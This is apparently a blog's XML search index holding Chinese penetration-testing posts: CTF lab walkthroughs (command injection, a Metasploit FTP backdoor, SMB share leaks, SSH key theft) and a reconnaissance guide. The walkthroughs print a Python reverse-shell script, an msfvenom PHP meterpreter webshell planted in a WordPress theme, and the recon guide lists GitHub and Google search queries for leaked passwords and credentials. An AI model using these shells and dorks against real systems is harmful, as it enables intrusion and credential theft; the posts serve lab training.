<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2020-03-27</title>
    <url>/2020/03/27/2020-03-27/</url>
    <content><![CDATA[<h2 id="2020年计划"><a href="#2020年计划" class="headerlink" title="2020年计划"></a>2020年计划<a id="more"></a></h2><h1 id="19年"><a href="#19年" class="headerlink" title="19年"></a>19年</h1><p>2019年是我接触渗透测试的元年，严格来说：只是我开始学习渗透知识的一年，并不算是真正接触渗透测试，在这一年期间我做了这么几件事情:<br><img src="/images/2020/19%E5%B9%B4.png" alt=""></p>
<pre><code>1.学习常见的“web漏洞”：利用sqlmap挖掘注入漏洞进入后台、利用&quot;auth&quot;存在逻辑缺陷bypass从而造成越权的危害等等...
2.学习kali linux和常见的渗透工具：常见的cve漏洞ms08067拿反弹shell；学习后渗透、域渗透、提权等；工具MSF、Nessus、netcat、nmap、burpsuit等等，工具真的太多了，后来发现就算你把kali所有的工具学个遍你也不会成为大佬，但这都是基础。
3.再后来我发现学完这些，挖洞的效率低，于是乎：我又去学了Python，从基础语法到Python核心编程；学习爬虫、学习各种库、os、datatime、sys、socket、thereading、xml、xpath、request、re等等；尽管学完这些、爬虫效率总是不尽人意于是乎又写了scrapy框架、学习twisted异步操作数据库、用爬取的内容存入数据库，用到的时候随时取出。
4.linux的使用频率随着我学到的东西越来越多，也会用的更加频繁，如此的工作量存在一定的重复性怎么办、bash编程无疑是一个好的解决方案：
于是乎我又去学习了bash编程，利用bash编程将一切可以工程化的工作自动完成。</code></pre><p>学了一年我总算是了解了渗透测试的一些皮毛，在一年我兴奋过、疑惑过、甚至想放弃过。也曾怀疑过自己也许不适合这个行业，但是当我后来当我回过头来看时，我也确实增加了很多技能点，这总比躺着好吧！即使没有天赋。</p>
<pre><code>这里引用“余玄”大佬的一句话：</code></pre><blockquote>
<p>“我眼中的 Python、大数据、产品、项目、运营、营销、黑客等等等，都是一种技能而已，没什么特别，你也可以掌握，它们就在那，就像玩孢子游戏一样，你要足够大才能吃掉那些比你小的，而你还不够大时，却盲目贪婪，小心你自己被吃掉。”</p>
</blockquote>
<p>这句话让我感触颇深，确实这些东西在一个黑客眼中都只是一种技能而已，我反问自己我所学到的技能，需要完全掌握的技能点，我真的掌握了吗？<br><strong>不，我没有！</strong></p>
<hr>
<h1 id="20年"><a href="#20年" class="headerlink" title="20年"></a>20年</h1>]]></content>
      <categories>
        <category>MyPlan</category>
      </categories>
  </entry>
  <entry>
    <title>CTF- 靶场夺旗</title>
    <url>/2019/12/15/CTF-%E9%9D%B6%E5%9C%BA%E5%A4%BA%E6%97%97/</url>
    <content><![CDATA[<h2 id="一、CTF介绍"><a href="#一、CTF介绍" class="headerlink" title="一、CTF介绍"></a>一、CTF介绍</h2><p>CTF是一种流行的信息安全竞赛形式，其英文名可直译为“夺得Flag”，也可意译为“夺旗赛”。<a id="more"></a>其大致流程是，参赛团队之间通过进行攻防对抗、程序分析等形式，率先从主办方给出的比赛环境中得到一串具有一定格式的字符串或其他内容，并将其提交给主办方，从而夺得分数。为了方便称呼，我们把这样的内容称之为“Flag”。</p>
<h2 id="二、实验环境"><a href="#二、实验环境" class="headerlink" title="二、实验环境"></a>二、实验环境</h2><p>攻击机：kali linux（192.168.0.4）桥接模式<br>靶机：192.168.0.100 桥接模式</p>
<h2 id="三、实验过程"><a href="#三、实验过程" class="headerlink" title="三、实验过程"></a>三、实验过程</h2><p><strong>1、信息探测</strong><br>扫描主机开放的端口号</p>
<ul>
<li>nmap -p- -T4 靶场lP地址<br><img src="/images/ctf/ctf1.png" alt=""></li>
</ul>
<p>快速扫描主机全部信息</p>
<ul>
<li>nmap -T4 -A -v 靶场lP地址<br><img src="/images/ctf/ctf2.png" alt=""><br><img src="/images/ctf/ctf3.png" alt=""></li>
</ul>
<p>探测敏感信息</p>
<ul>
<li><p>nikto -host http://靶场lP地址：端口<br><img src="/images/ctf/ctf4.png" alt=""><br><img src="/images/ctf/ctf5.png" alt=""></p>
</li>
<li><p>dirb http://靶场lP地址：端口<br><img src="/images/ctf/ctf6.png" alt=""><br><img src="/images/ctf/ctf7.png" alt=""></p>
</li>
</ul>
<p><strong>2、深入挖掘</strong><br>分析nmap、nikto扫描结果，挖掘可以利用的信息；</p>
<p>对于大端口非http服务，可以使用nc来探测该端口的banner信息；</p>
<ul>
<li>nc ip地址 端口号<br><img src="/images/ctf/ctf8.png" alt=""><br><em>根据分析，我们可以得到13337和60000应该是非http服务</em><br><img src="/images/ctf/ctf9.png" alt=""></li>
</ul>
<p>对于大端口http服务，可以使用浏览器浏览界面查看源代码，寻找lag值；<br><img src="/images/ctf/ctf10.png" alt=""><br><em>根据分析，可以得到80和9090是http服务，于是我们用浏览器尝试打开</em></p>
<ul>
<li><a href="http://ip地址：端口号" target="_blank" rel="noopener">http://ip地址：端口号</a><br><img src="/images/ctf/ctf11.png" alt=""><br><em>又发现一个flag值</em></li>
</ul>
<p><strong>3、更深入挖掘</strong><br>FTP 匿名登录挖掘敏感信息；<br><img src="/images/ctf/ctf12.png" alt=""><br><em>由之前的nmap扫描中发现，存在ftp服务，并且可以匿名登陆</em><br>在浏览器中输入ftp://靶场lP地址 匿名登录tp服务器根目录，查看敏感文件，注意一定要查看源代码；<br><img src="/images/ctf/ctf13.png" alt=""></p>
<p>发现robots.txt文件<br><img src="/images/ctf/ctf14.png" alt=""></p>
<ul>
<li>在站点robots.txt文件中寻找敏感文件，挖掘敏感文件漏洞；<br><img src="/images/ctf/ctf16.png" alt=""></li>
</ul>
<p><img src="/images/ctf/ctf17.png" alt=""><br><img src="/images/ctf/ctf18.png" alt=""><br><img src="/images/ctf/ctf19.png" alt=""><br><em>打开三个目录后发现 <a href="http://192.168.0.10/cgi-bin/tracertool.cgi这个URL存在交互，于是进行下一步测试" target="_blank" rel="noopener">http://192.168.0.10/cgi-bin/tracertool.cgi这个URL存在交互，于是进行下一步测试</a></em><br><img src="/images/ctf/ctf20.png" alt=""><br><img src="/images/ctf/ctf21.png" alt=""><br>果然存在命令执行的漏洞，于是尝试打开/etc/passwd文件<br>但是cat打不开，应该是被过滤了<br>对于命令执行中，为了绕过对应的限制，可以使用相近命令来代替限制的shell命令<br>如cat more<br><img src="/images/ctf/ctf22.png" alt=""><br><img src="/images/ctf/ctf23.png" alt=""><br><em>由于之前提示我们Morty的用户的密码可能无法破解，于是我们重点放在Summer账户</em></p>
<p><strong>4、登录靶场机器</strong><br>获得对应的用户名和密码之后，可以通过ssh来登录系统，查看对应的lag值<br><img src="/images/ctf/ctf24.png" alt=""><br><em>这里22端口被拒绝连接了</em><br><img src="/images/ctf/ctf25.png" alt=""><br>分析之前的端口：22222可能可以登录<br>ssh-p port 用户名@靶场lP地址<br><img src="/images/ctf/ctf26.png" alt=""><br><em>无奈尝试弱密码失败</em><br>这个时候想起之前的在查看源码，发现了一个password<br><img src="/images/ctf/ctf27.png" alt=""><br>之后输入对应的密码登录系统<br><img src="/images/ctf/ctf28.png" alt=""><br>pwd Is cat more<br>执行命令查看flag值<br><img src="/images/ctf/ctf29.png" alt=""></p>
<h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><p>注意未知服务的端口，可以使用nc获取对应的banner信息；<br>使用对应相近的shell命令来绕过限制；如cat more<br>对每一个服务都需要进行对应的探测，不放过任何一个可以利用的点</p>
]]></content>
      <categories>
        <category>CTF夺旗训练</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF-FTP服务后门利用</title>
    <url>/2019/12/14/CTF-FTP%E6%9C%8D%E5%8A%A1%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<h2 id="一、FTP介绍"><a href="#一、FTP介绍" class="headerlink" title="一、FTP介绍"></a>一、FTP介绍</h2><p>FTP是File Transfer Protocol（文件传输协议）的英文简称，而中文简称为“文传协议”。用于Internet上的控制文件的双向传输。<a id="more"></a>同时，它也是一个应用程序（Application）。基于不同的操作系统有不同的FTP应用程序，而所有这些应用程序都遵守同一种协议以传输文件。在FTP的使用当中，用户经常遇到两个概念：“下载” (Download)和“上传”（Upload）。”下载”文件就是从远程主机拷贝文件至自己的计算机上，“上传”文件就是将文件从自己的计算机中拷贝至远程主机上。用Internet语言来说，用户可通过客户机程序向（从）远程主机上传（下载）文件。</p>
<h2 id="二、实验环境"><a href="#二、实验环境" class="headerlink" title="二、实验环境"></a>二、实验环境</h2><p>攻击机：kali linux 192.168.43.153<br>靶场机器：192.168.43.138</p>
<h2 id="三、实验过程"><a href="#三、实验过程" class="headerlink" title="三、实验过程"></a>三、实验过程</h2><p><strong>1、信息探测</strong><br>扫描主机服务信息以及服务版本<br>nmap -sV靶场lP地址<br><img src="/images/ftp/ftp1.png" alt=""></p>
<p>快速扫描主机全部信息<br>nmap-T4-A-v靶场lP地址<br><img src="/images/ftp/ftp2.png" alt=""></p>
<p><strong>2、发现漏洞</strong><br>分析nmap扫描结果，并对结果进行分析，挖掘可以利用的信息；<br><img src="/images/ftp/ftp3.png" alt=""><br>使用seachsploit，查看漏洞信息，找到可利用的溢出代码；<br><img src="/images/ftp/ftp4.png" alt=""></p>
<p><strong>3、使用metasploit进行溢出</strong><br>打开Metasploit 在终端中输入msfconsole<br>输入search对应的软件及版本号</p>
<p>使用exploit<br>-use exploit<br><img src="/images/ftp/ftp5.png" alt=""></p>
<p>查看可以使用的payload<br>-show payload<br><img src="/images/ftp/ftp6.png" alt=""></p>
<p>设置payload<br>–set payload<br><img src="/images/ftp/ftp7.png" alt=""></p>
<p>设置参数<br>–show options<br>-set rhost 靶场lP<br>-set lhost 靶场lP</p>
<p>进行远程溢出<br>-exploit<br><img src="/images/ftp/ftp7.png" alt=""><br><img src="/images/ftp/ftp8.png" alt=""></p>
<p>执行命令<br>id<br><img src="/images/ftp/ftp9.png" alt=""></p>
<p><strong>4、优化shell使用</strong><br>python pty开启终端</p>
<pre><code>python -c &quot;import pty;pty.spawn(&apos;/bin/bash&apos;)&quot;</code></pre><p><img src="/images/ftp/ftp10.png" alt=""></p>
<p><strong>5、获取Flag</strong><br>一般情况下，靶场机器的lag值是存放在服务器的根目录下，/root/目录。<br>cd/root/<br>Is<br>cat flag<br>writeup 测试文档 总结文档<br><img src="/images/ftp/ftp10.png" alt=""></p>
<h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><p>对于开放FTP、SSH、Telnet等服务的系统，可以尝试一些对应服务版本的漏洞代码；<br>对于系统，一定要注意利用现成的EXP来root主机；</p>
]]></content>
      <categories>
        <category>CTF夺旗训练</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>FTP远程溢出</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF-SMB信息泄露</title>
    <url>/2019/12/14/CTF-SMB%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/</url>
    <content><![CDATA[<h2 id="一、SMB介绍"><a href="#一、SMB介绍" class="headerlink" title="一、SMB介绍"></a>一、SMB介绍</h2><p>SMB（Server Message Block）通信协议是微软（Microsoft）和英特尔（Intel）在1987年制定的协议，主要是作为Microsoft网络的通讯协议。后来Linux移植了SMB，并称为samba。<a id="more"></a></p>
<p>SMB协议是基于TCP-NETBIOS下的，一般端口使用为139，445</p>
<p>SMB协议，计算机可以访问网络资源，下载对应的资源文件</p>
<h2 id="二、实验环境"><a href="#二、实验环境" class="headerlink" title="二、实验环境"></a>二、实验环境</h2><p>攻击机：kali linux 192.168.43.153<br>靶场机器：192.168.43.137<br>目的：获取靶场机器的flag值</p>
<h2 id="三、实验过程"><a href="#三、实验过程" class="headerlink" title="三、实验过程"></a>三、实验过程</h2><p><strong>1、信息探测：</strong></p>
<ul>
<li>nmap -sV IP        挖掘开放服务信息<br><img src="/images/smb/smb1.png" alt=""></li>
<li>nmap -A -v -T4 IP  挖掘靶场全部信息<br><img src="/images/smb/smb2.png" alt=""><br><img src="/images/smb/smb3.png" alt=""></li>
</ul>
<p><strong>2、 针对SMB协议弱点分析</strong><br><em>1.针对SMB协义，使用空口令，若口令尝试登陆，并查看敏感卡载查看；</em></p>
<ul>
<li><p>smbclient -L IP<br><img src="/images/smb/smb4.png" alt=""></p>
</li>
<li><p>smbclient \‘IP\share$’<br>尝试登陆上面的sharename结果share可以用空密码进去，并且存在敏感文件<br><img src="/images/smb/smb5.png" alt=""></p>
</li>
<li><p>get 敏感文件<br><img src="/images/smb/smb6.png" alt=""><br>进一步嗅探<br><img src="/images/smb/smb7.png" alt=""><br>果然有发现<br><img src="/images/smb/smb8.png" alt=""><br>尝试登陆数据库<br><img src="/images/smb/smb9.png" alt=""><br>登陆失败！！！</p>
</li>
</ul>
<p><em>2.针对SMB协议远程溢出漏洞进行分析；</em><br><img src="/images/smb/smb10.png" alt=""></p>
<ul>
<li>searchsploit samba 版本号<br><img src="/images/smb/smb11.png" alt=""></li>
</ul>
<p><strong>3、针对HTTP协议弱点分析</strong><br><em>1.浏览器查看网站；</em><br><img src="/images/smb/smb12.png" alt=""></p>
<p><em>2.使用dirb nikto探测；</em><br><img src="/images/smb/smb13.png" alt=""><br><img src="/images/smb/smb14.png" alt=""></p>
<p><em>3.寻找突破点，目标登录后台，上传webshell；</em></p>
<p><img src="/images/smb/smb18.png" alt=""></p>
<p> <strong>- 制作webshell</strong></p>
<p>msfvenom -p php/meterpreter/reverse_tcp -lhost=攻击机ip地址 Iport=4444 -f raw&gt;/root/Desktop/shell.php<br><img src="/images/smb/smb16.png" alt=""></p>
<p> <strong>- 启动监听</strong><br>msf&gt;use exploit/multi/handler<br>msf exploift（handler）&gt;set payload php/meterpreter/reverse_tcp<br>msf exploift（handler）&gt;set lhost 攻击机IP地址<br>msf exploit（handler）&gt;set lport 4444<br>msf exploit（handler）&gt;run</p>
<p> <strong>- 上传Webshell</strong><br>使用找到的敏感信息登录系统后台，上传webshell。执行<br>webshell（访问具有webshell的php页面）<br><img src="/images/smb/smb17.png" alt=""></p>
<p>wordpress 上传点theme 404.php<br>执行：http:/靶场IP/wordpress/wp-content/themes/twentyfifteen/404.php<br><img src="/images/smb/smb19.png" alt=""></p>
<p>获得反弹的shell<br><img src="/images/smb/smb20.png" alt=""></p>
<p><strong>4、查找flag信息</strong><br>优化终端：</p>
<pre><code>python -c&quot;import pty;pty.spawn（&apos;/bin/bash&apos;）&quot;</code></pre><p><img src="/images/smb/smb21.png" alt=""></p>
<p>查找敏感信息，提升root权限，查看flag值。<br><img src="/images/smb/smb22.png" alt=""></p>
<p>查找用户名：cat/etc/passwd查找密码：在共享目录下的敏感文件，提升权限<br>–su用户名<br>–sudo -l<br>–su sudo<br><img src="/images/smb/smb23.png" alt=""><br><img src="/images/smb/smb24.png" alt=""><br><em>很幸运的使用弱密码登陆了进来了</em><br><img src="/images/smb/smb25.png" alt=""></p>
<h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><p>对于开放139和445端口的机器一定要注意是否可以直接使用smbclient登录到共享目录查找敏感文件。<br>一般情况下lag值都在/root目录下，并且需要提升root权限才能查看内容；</p>
]]></content>
      <categories>
        <category>CTF夺旗训练</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>SMB</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF-SSH私钥泄露CTF-SSH服务测试</title>
    <url>/2019/12/14/CTF-SSH%E7%A7%81%E9%92%A5%E6%B3%84%E9%9C%B2/</url>
    <content><![CDATA[<h2 id="一、实验环境"><a href="#一、实验环境" class="headerlink" title="一、实验环境"></a>一、实验环境</h2><p>攻击机：kali linux（192.168.43.153）NAT模式<br>靶机：born2root<a id="more"></a> 后面找机会把链接补上（192.168.0.6）桥接模式</p>
<h2 id="二、实验过程"><a href="#二、实验过程" class="headerlink" title="二、实验过程"></a>二、实验过程</h2><p>1、当我们拿到目标主机的ip地址先用zenmap进行端口扫描<br><img src="/images/s1.png" alt=""><br>发现开启了22端口和80端口，接下来首先对80端口进行探测</p>
<p>2、用dirb进行目录扫描发现<br><img src="/images/s2.png" alt=""><br><em>打开链接存在得到几个有用的信息</em></p>
<ul>
<li>可能作为ssh的登陆名<br><img src="/images/s3.png" alt=""></li>
<li>得到RSA的私钥<br><img src="/images/s4.png" alt=""></li>
</ul>
<p>3、用上面得到的rsa私钥和用户名尝试登陆<br><img src="/images/s5.png" alt=""><br>结果比较幸运的是用martin成功登陆了目标主机，不过只是一个普通的权限<br><img src="/images/s6.png" alt=""></p>
<p>4、接下来对得到的靶机进行扩大战果</p>
<ul>
<li><p>查看/home目录下的用户</p>
</li>
<li><p>查看/root目录是否存flag.txt</p>
</li>
<li><p>查看/tmp<br><img src="/images/s7.png" alt=""><br>发现了其他的用户，与之前判断的信息相符合</p>
</li>
<li><p>cat/etc/passwd  查看所有用户的列表cat/etc/group<br><img src="/images/s8.png" alt=""></p>
</li>
<li><p>挖掘/etc/crontab下是否有某个用户的定时计划文件<br><img src="/images/s9.png" alt=""><br>发现存在定时执行”.py”文件，但是/tmp里面呢并没有这个文件，于是我们尝试编写一个“反弹的shell”</p>
<p>sekurity.py里面的内容为：<br> #/usr/bin/python<br> import os,subprocess,socket<br> s=socket.socket()<br> s.connect(“攻击机ip地址”,”攻击机监听端口”)<br> os.dup2(s.fileno(),0)<br> os.dup2(s.fileno(),1)<br> os.dup2(s.fileno(),2)<br> p=subprocess.call([“/bin/sh”,”-i”])</p>
<p><img src="/images/s10.png" alt=""><br><em>开启监听</em><br>这里因为我的kali是用NAT，而靶机用的桥接模式，所以并没有收到反弹的shell</p>
</li>
</ul>
<p>6、尝试对hadi账户ssh进行暴力破解<br><em>pass_file文件的准备</em><br>使用cupp进行个性化的密码生成<br><img src="/images/s12.png" alt=""><br><img src="/images/s13.png" alt=""><br>生成后，我们会在其路径下有一个txt文件<br><img src="/images/s14.png" alt=""></p>
<p><em>使用msfconsole进行ssh登陆</em><br>使用对应的模块<br><img src="/images/s11.png" alt=""><br>设置参数<br><img src="/images/s15.png" alt=""><br>run<br><img src="/images/s16.png" alt=""><br>进入sessions<br><img src="/images/s17.png" alt=""><br>我们可以看到会话比较简陋<br>Python的模块进行优化<br><img src="/images/s19.png" alt=""><br>    python -c “import pty;pty.spawn(‘/bin/bash’)”</p>
<p>7、成功提权拿到<strong>flag</strong><br><img src="/images/s18.png" alt=""></p>
<h2 id="三、总结"><a href="#三、总结" class="headerlink" title="三、总结"></a>三、总结</h2><p><strong>（1）、初步嗅探</strong></p>
<ul>
<li>nmap主机发现、端口扫描</li>
<li>目录扫描，查找敏感目录“‘robots.txt等”</li>
</ul>
<p><strong>（2）、扩大战果</strong><br>登录服务器之后，我们需要做以下操作。</p>
<ul>
<li>1、查看当前用户whoami </li>
<li>2、id查看当前用户的权限 </li>
<li>3、查看根目录寻找flag文件</li>
</ul>
<p>如果是root权限，那么表明这个靶场就被全部拿下。但是如果不是，就肯定需要提权。一般情况下，flag文件只属于root用户和对应的用户组；</p>
<ul>
<li>cat/etc/passwd  查看所有用户的列表cat/etc/group</li>
<li>查看用户组 find/-user 用户名 </li>
<li>查看属于某些用户的文件 /tmp  查看缓冲文件目录</li>
</ul>
<p><strong>（3）、深入挖掘</strong><br>通过/etc/crontab文件，设定系统定期执行的任务，编辑，需要roo权限。<br>挖掘/etc/crontab下是否有某个用户的定时计划文件，但是具体目录下没有这个定时执行的文件，可以自行创建反弹shell，然后netcat执行监听获取对应用户的权限。</p>
<p><strong>（4）、具体思路</strong><br>在对SSH服务渗透中，大部分情况是利用获取的私钥文件，直接使用用户名和私钥文件登录靶场机器，个别情况进行暴力破解获取用户密码，通过用户名和对应用户登录靶场机器。<br>CTF中要特别注意/tmp数据缓冲目录以及/etc/crontab设置定时执行的文件</p>
]]></content>
      <categories>
        <category>CTF夺旗训练</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>SSH私钥</tag>
      </tags>
  </entry>
  <entry>
    <title>信息收集_base1”</title>
    <url>/2019/11/04/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86_base1/</url>
    <content><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>信息收集对于渗透测试整个过程来说是非常重要的，能否挖掘到漏洞很大一部分取决于信息的收集是否全面，只有想尽办法收集到更多信息，你挖掘到漏洞的可能性越大，<a id="more"></a>本文章主要对目前较为经典与流行的信息收集的一些手段进行总结。</p>
<h1 id="信息收集方法总结"><a href="#信息收集方法总结" class="headerlink" title="信息收集方法总结"></a>信息收集方法总结</h1><h2 id="whois和备案"><a href="#whois和备案" class="headerlink" title="whois和备案"></a>whois和备案</h2><p>1、使用各大whois网站查询<br><a href="https://whois.aliyun.com" target="_blank" rel="noopener">阿里云whois: https://whois.aliyun.com</a><br><a href="https://www.whois365.com/cn" target="_blank" rel="noopener">whois365: https://www.whois365.com/cn</a><br><a href="http://whois.chinaz.com" target="_blank" rel="noopener">站长之家: http://whois.chinaz.com</a><br><a href="https://www.whois.com/whois" target="_blank" rel="noopener">国外的whois: https://www.whois.com/whois</a></p>
<p><img src="/images/x2.png" alt=""></p>
<p>2、使用kali linux </p>
<pre><code>例如:whois qq.com</code></pre><p><img src="/images/x1.png" alt=""></p>
<p>3、备案信息查询<br>国内的网站如果通过whois网站没有查询到太多的信息，可以到备案查询，需要知道的是：国外网站是不需要备案的<br><a href="http://www.beianbeian.com/" target="_blank" rel="noopener">http://www.beianbeian.com/</a><br><a href="http://beian.miit.gov.cn/publish/query/indexFirst.action" target="_blank" rel="noopener">http://beian.miit.gov.cn/publish/query/indexFirst.action</a></p>
<p><img src="/images/x11.png" alt=""></p>
<p>通过收集到的特征信息 “**联系邮箱，联系电话，注册人，DNS解析服务器…，可以用于后面的后台密码破解、社工测试</p>
<h2 id="子域名"><a href="#子域名" class="headerlink" title="子域名"></a>子域名</h2><p>1、子域名挖掘工具</p>
<pre><code>如：Maltego CE、wydomain、subDomainsBrute、dnsmaper、Layer子域名挖掘机。</code></pre><p>这里推荐两款子域名挖掘的工具:</p>
<pre><code>subDomainsBrute和layer(windows端)</code></pre><p><img src="/images/x10.png" alt=""><br>简单的使用</p>
<pre><code>域名文件会保存到subDomainsBr的目录下，并且以域名命名</code></pre><p><img src="/images/x4.png" alt=""></p>
<p>2、搜索引擎挖掘如：<br>在Google中输入site:qq.com</p>
<pre><code>寻找url头带有index.php的链接</code></pre><p><img src="/images/x5.png" alt=""></p>
<p>寻找标题带有后台等敏感信息<br><img src="/images/x6.png" alt=""></p>
<p>上面介绍了两个比较常用的谷歌黑客语法，大家可以尝试更多不同语法和组合</p>
<p>3、第三方DNS数据集网站查询：</p>
<p><img src="/images/x8.png" alt=""></p>
<p><a href="https://fofa.so/" target="_blank" rel="noopener">https://fofa.so/</a><br><a href="http://tool.chinaz.com/subdomain" target="_blank" rel="noopener">http://tool.chinaz.com/subdomain</a><br><a href="https://www.virustotal.com/gui/home/search" target="_blank" rel="noopener">https://www.virustotal.com/gui/home/search</a><br><a href="https://dnsdumpster.com/" target="_blank" rel="noopener">https://dnsdumpster.com/</a></p>
<p>4、证书透明度公开日志枚举：</p>
<p><img src="/images/x12.png" alt=""></p>
<p><a href="https://crt.sh/" target="_blank" rel="noopener">https://crt.sh/</a><br><a href="http://censys.io/" target="_blank" rel="noopener">http://censys.io/</a></p>
<p>5、其他途径：</p>
<p><img src="/images/x13.png" alt=""></p>
<p><img src="/images/x20.png" alt=""></p>
<p><a href="https://phpinfo.me/domain" target="_blank" rel="noopener">https://phpinfo.me/domain</a><br><a href="http://dns.aizhan.com" target="_blank" rel="noopener">http://dns.aizhan.com</a><br><a href="https://github.com/" target="_blank" rel="noopener">https://github.com/</a></p>
<p>Github主要是用来分享开源项目的社区，同样可以用Github来针对性的搜索子域名，二级域名，三级域名等等</p>
<p><img src="/images/x7.png" alt=""></p>
<h2 id="站点信息"><a href="#站点信息" class="headerlink" title="站点信息"></a>站点信息</h2><p>CMS识别工具：<br>1、在线工具 </p>
<p><img src="/images/x14.png" alt=""></p>
<p><a href="http://whatweb.bugscaner.com/look" target="_blank" rel="noopener">http://whatweb.bugscaner.com/look</a><br><a href="http://www.yunsee.cn/finger.html" target="_blank" rel="noopener">http://www.yunsee.cn/finger.html</a></p>
<p>2、本地工具</p>
<pre><code>whatweb、御剑web指纹识别程序</code></pre><p><a href="https://pan.baidu.com/share/link?shareid=437376&uk=3526832374" target="_blank" rel="noopener">https://pan.baidu.com/share/link?shareid=437376&amp;uk=3526832374</a></p>
<pre><code>大禹CMS识别程序 </code></pre><p><a href="https://github.com/Ms0x0/Dayu" target="_blank" rel="noopener">https://github.com/Ms0x0/Dayu</a></p>
<h2 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h2><p>1、使用nmap探测。nmap -A -v -T4 tags</p>
<p><img src="/images/x9.png" alt=""></p>
<p>2、使用masscan探测。</p>
<p><img src="/images/x15.png" alt=""></p>
<p>3、使用在线网站探测<br><a href="http://tool.chinaz.com/port/" target="_blank" rel="noopener">http://tool.chinaz.com/port/</a></p>
<pre><code>常见端口服务以及入侵方式:</code></pre><p><img src="/images/x21.png" alt=""></p>
<h2 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h2><p>指的是利用搜索引擎搜索目标暴露在互联网上的关联信息。<br>例如：数据库文件、SQL注入、服务器配置信息、甚至是通过Git找到站点泄露源代码、以及Redis等未授权访问、robots.txt等敏感信息</p>
<p>1、Google hacking数据库：<br><a href="https://www.exploit-db.com/google-hacking-database/" target="_blank" rel="noopener">https://www.exploit-db.com/google-hacking-database/</a></p>
<p>例如：查询Access数据：</p>
<pre><code>filetype:mdb &quot;standard jet&quot; (password | username | user | pass</code></pre><p>2、获取HTTP响应的方法：</p>
<pre><code>利用工具如：浏览器审计工具、Burpsuite等代理截断工具。</code></pre><p><img src="/images/x16.png" alt=""></p>
<pre><code>编写Python脚本requests库参考链接：</code></pre><p><a href="http://www.python-requests.org/en/master/" target="_blank" rel="noopener">http://www.python-requests.org/en/master/</a></p>
<pre><code>import requests 
r=requests.get（&apos;目标’）
print（r.headers）</code></pre><p>3、Github信息泄露</p>
<p><img src="/images/x17.png" alt=""></p>
<p>Github之邮件配置信息泄露：</p>
<pre><code>site:Github.com smtp
site:Github.com smtp@qq.com </code></pre><p>Github之数据库信息泄露：</p>
<pre><code>site:Github.com sa password
site:Github.com root password
site:Github.com User ID=&apos;sa&apos;；Password </code></pre><p>Github之svn信息泄露：</p>
<pre><code>site:Github.com svn
site:Github.com svn username </code></pre><p>Github之综合信息泄露：</p>
<pre><code>site:Github.com password
site:Github.com ftp ftppassword
site:Github.com 密码
site:Github.com内部</code></pre><h2 id="真实IP地址收集"><a href="#真实IP地址收集" class="headerlink" title="真实IP地址收集"></a>真实IP地址收集</h2><h3 id="cdn检测"><a href="#cdn检测" class="headerlink" title="cdn检测"></a>cdn检测</h3><p>1、通过ping是否存在CDN服务器 </p>
<pre><code>例如：ping www.baihe.com 会显示：dhntip</code></pre><p>2、通过在线ping测试 </p>
<pre><code>使用：ping.chinaz.com</code></pre><h3 id="绕过cdn"><a href="#绕过cdn" class="headerlink" title="绕过cdn"></a>绕过cdn</h3><p>如果没有使用cdn可以使用ping或者<a href="http://www.ip138.com直接查询" target="_blank" rel="noopener">www.ip138.com直接查询</a><br>如果目标使用CDN，需要绕过CDN来获取真实IP地址。</p>
<pre><code>1、内部邮箱源 收集到内部邮箱服务器IP地址
2、网站phpinfo文件 phpinfo.php
3、分站IP地址，查询子域名 CDN很贵，很有可能分站就不再使用CDN。
4、国外访问 &lt;https://asm.ca.com/en/ping.php&gt;
5、查询域名解析记录 &lt;https://viewdns.info/&gt;</code></pre><h2 id="旁站、C段"><a href="#旁站、C段" class="headerlink" title="旁站、C段"></a>旁站、C段</h2><p>旁站：通俗来讲旁站指的是和目标web服务在同一个服务器的其他站点<br>c段：是和目标服务器ip处在同一个C段的其它服务器，通常大型的企业会买下整个c段<br>1、站长之家：<a href="http://s.tool.chinaz.com/same" target="_blank" rel="noopener">http://s.tool.chinaz.com/same</a><br><img src="/images/x23.png" alt=""><br>2、利用Google，语法：site:192.168.0.*<br>3、利用Nmap 的 -open参数</p>
<pre><code>语法：nmap -p 80,8080 –open ip/24</code></pre><p>4、K8工具、御剑、北极熊扫描器等<br>5、在线：<a href="http://www.webscan.cc/" target="_blank" rel="noopener">http://www.webscan.cc/</a><br><img src="/images/x22.png" alt=""></p>
<h2 id="waf识别"><a href="#waf识别" class="headerlink" title="waf识别"></a>waf识别</h2><h4 id="wafw00f用于WEB应用防火墙识别"><a href="#wafw00f用于WEB应用防火墙识别" class="headerlink" title="wafw00f用于WEB应用防火墙识别"></a>wafw00f用于WEB应用防火墙识别</h4><p>wafw00f -l 显示可以识别的waf<br>wafw00f <a href="http://www.microsoft.com" target="_blank" rel="noopener">http://www.microsoft.com</a><br><img src="/images.x24.png" alt=""></p>
<h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><p>nmap <a href="http://www.microsoft.com" target="_blank" rel="noopener">www.microsoft.com</a> <strong>–script=http-waf-detect.nse</strong></p>
<p><img src="/images.x25.png" alt=""></p>
<h3 id="发送恶意请求"><a href="#发送恶意请求" class="headerlink" title="发送恶意请求"></a>发送恶意请求</h3><pre><code>这种方式直接引起waf的机制
如图是**安全狗**的waf触发</code></pre><p><img src="/images.x26.png" alt=""></p>
